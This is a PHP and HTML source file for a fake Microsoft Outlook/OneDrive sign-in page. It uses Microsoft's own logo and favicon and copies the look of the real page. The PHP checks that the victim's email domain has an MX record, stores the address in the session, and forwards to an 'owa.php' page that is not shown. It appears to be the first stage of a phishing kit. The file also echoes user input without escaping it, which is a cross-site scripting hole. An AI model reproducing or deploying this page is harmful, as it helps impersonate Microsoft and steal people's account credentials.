<?php
session_start();
function random_number(){
	$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key = array_rand($numbers);
	return $numbers[$key]; 
}

$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));

if(isset($_POST['next']) && !empty($_POST['next'])) {
        $email = $_POST['email'];
        $domain = substr(strrchr($email, "@"), 1);
            
    function domain_exists($email, $record = 'MX'){
            list($user, $domain) = explode('@', $email);
            return checkdnsrr($domain, $record);
    }
    if(domain_exists($email)) {
            $_SESSION['email']="$email";
			header("Location: owa.php?$url");
    }
    else {
            $_SESSION['msg']="$domain isn't in our system. Make sure you typed it correctly.";
    }
    
}

    
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta content="width=device-width, initial-scale=1" name="viewport" />
<title>Sign in to Outlook</title>
<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script> 
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.js"></script>
<link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
<link rel="apple-touch-icon" sizes="180x180" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
</head>
    
<style>
    @import url('https://fonts.googleapis.com/css?family=Open+Sans&display=swap');
    
    body{
        background-image: url(https://i.imgur.com/I4Qd9nH.jpg);
        background-repeat: no-repeat;
        background-size: cover;
        text-align: center;
        border: 0;
        outline: 0;
    }
    
    .error{
        color: #ea3e23;
        font-family: 'Open Sans', sans-serif;
        font-size: 14px;
        text-align: left;
    }
    
    input[type=text].error:focus{
    border-bottom-color: #ea3e23;
	border-bottom-style: solid;   
    border-width: 1px;
    outline: 0;
    color: #333333;
    }
  
    .logo{
        padding-top: 11%;
        padding-bottom: 1.2%;
        width: 180px;
        image-resolution: from-image;
    }
    
    fieldset{
        border: 0;
        background-color: #ffffff;
        width: 415px;
        height: 334px;
        margin: 0 auto;
        outline: none;
        align-self: center;
    }
    
    form{
        margin: 8% 8%;
    }
    
    .micrologo{
        float: left;
    }
    
    h1{
        padding-top: 2%;
        width: 100%;
        text-align: left;
        font-family: 'Roboto', sans-serif;
        font-size: 24px;
        color: #333;
        
    }
    
    p{
        line-height: 0;
        margin-top: -8px;
        text-align: left;
        font-family: 'Roboto', sans-serif;
        font-size: 13px;
        font-weight: lighter;
        padding-bottom: 5%;
    }

    
    input[type=text]{
        width: 345px;
        height: 25px;
        border-style: none none solid none;
        border-width: thin;
        font-size: 14px;
        font-family: 'Open Sans', sans-serif;
        font-weight: lighter;
        outline: 0;
        padding-bottom: 3px;
        padding-top: 1%;
    }
    
    input[type=text]:focus{
    border-bottom-color: #0078d7;
	border-bottom-style: solid;   
    border-width: 1px;
    outline: 0;
    }
    
    input[type=submit]{
        font-size: 15px;
        color: #FFFFFF;
        float: right;
        border: 0;
        outline: 0;
        height: 33px;
        width: 108px;
        background-color: #0869B6;
    }
    
    .footer {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
        height: 17px;
        background-color: #000000;
        opacity: 0.5;
        filter: alpha(opacity=50); /* For IE8 and earlier */
        padding-top: 10px;
        padding-bottom: 5px;
        padding-right: 150px;
    }
    
    .fnote {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
        height: 17px;
        z-index: 1;
        color: white;
        text-align: right;
        font-family: 'Roboto', sans-serif;
        font-size: 12px;
        padding-top: 10px;
        padding-bottom: 5px;
        padding-right: 150px;
    }
    
    .noaccess {
        float: left;
        font-family: 'Roboto', sans-serif;
        font-size: 13px;
        font-weight: normal;
        color: #0869B6;
    }
    
    a {
        text-decoration: none;
        color: #ffffff;
    }
    
@media screen and (max-width: 600px) {
    body {
        background-image: url(https://i.imgur.com/I4Qd9nH.jpg);
        background-repeat: no-repeat;
        background-size: auto;
        text-align: center;
        border: 0;
        outline: 0;
		padding: 0 1px;
        
    }
    
	.logo{
        padding-top: 4%;
        padding-bottom: 6%;
        width: 180px;
        image-resolution: from-image;
    }
	
    fieldset{
        border: 0;
        background-color: #ffffff;
        width: auto;
        height: 334px;
        margin: 0 auto;
        outline: none;
        align-self: center;
	}
	
	input[type=text]{
        width: 100%;
        height: 25px;
        border-style: none none solid none;
        border-width: thin;
        font-size: 14px;
        font-family: 'Open Sans', sans-serif;
        font-weight: lighter;
        outline: 0;
        padding-bottom: 3px;
        padding-top: 1%;
    }
    
    .footer {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
        height: 17px;
        background-color: #000000;
        opacity: 0.5;
        filter: alpha(opacity=50); /* For IE8 and earlier */
        padding-top: 10px;
        padding-bottom: 5px;
        padding-right: 150px;
    }
    
    .fnote {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
        height: 17px;
        z-index: 1;
        color: white;
        text-align: center;
        font-family: 'Roboto', sans-serif;
        font-size: 12px;
        padding-top: 10px;
        padding-bottom: 5px;
        padding-right: 150px;
    }
    
}
</style>
<body>

   
    <img src="https://i.imgur.com/eDXfU9D.png" class="logo">
    
    
    <fieldset>
    <form method="post" action="" autocomplete="off" name="login" id="login" autofocus>
       <img src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"  class="micrologo">
       <br>
       <h1>Sign in</h1>
       <p>to continue to OneDrive</p>
<div id="error" class="error"><? if (!empty($_SESSION['msg'])) {
 echo $_SESSION['msg'];
 unset($_SESSION['msg']);
 } ?>
</div>
       
        <input type="text"  name="email" id="email" placeholder="someone@example.com" value="<? echo $email; ?>">
<div>&nbsp;</div>
        <div class="noaccess"><a href="#" style="color:#0869B6;">Can't access your account?</a></div>
<div>&nbsp;</div>
<div>&nbsp;</div>
        <input type="submit" name="next" id="next" value="Next">
               
    </form>
   
    </fieldset>
    
    <div class="footer"></div>
    <div class="fnote">
        <span class="footernote"><a href="#"></a> &nbsp;&nbsp;&nbsp;&nbsp; <a href="#">Terms of use</a> &nbsp;&nbsp;&nbsp;&nbsp; <a href="#">Privacy & cookies</a> &nbsp;&nbsp;&nbsp;&nbsp; <a href="#">.&nbsp;.&nbsp;.</a>&nbsp;&nbsp;&nbsp;&nbsp;</span></div>

<script>
$(document).ready(function(){
  $("#login").validate({
      errorLabelContainer: '#error',
    // Specify validation rules
    rules: {
      email: {
        required: true,
        email: true
      },
    },
    messages: {     
     email: {
      required: "Enter a valid email address.",
      email: "Enter a valid email address.",
     },
    },
  
  });
});
</script>
<script>
  jQuery.fn.putCursorAtEnd = function() {

  return this.each(function() {
    
    // Cache references
    var $el = $(this),
        el = this;

    // Only focus if input isn't already
    if (!$el.is(":focus")) {
     $el.focus();
    }

    // If this function exists... (IE 9+)
    if (el.setSelectionRange) {

      // Double the length because Opera is inconsistent about whether a carriage return is one character or two.
      var len = $el.val().length * 2;
      
      // Timeout seems to be required for Blink
      setTimeout(function() {
        el.setSelectionRange(len, len);
      }, 1);
    
    } else {
      
      // As a fallback, replace the contents with itself
      // Doesn't work in Chrome, but Chrome supports setSelectionRange
      $el.val($el.val());
      
    }

    // Scroll to the bottom, in case we're in a tall textarea
    // (Necessary for Firefox and Chrome)
    this.scrollTop = 999999;

  });

};

(function() {
  
  var textInput = $("#email");

  textInput
    .putCursorAtEnd() // should be chainable
    .on("focus", function() { // could be on any event
      textInput.putCursorAtEnd()
    });
  
})();
</script>
</body>
    
</html>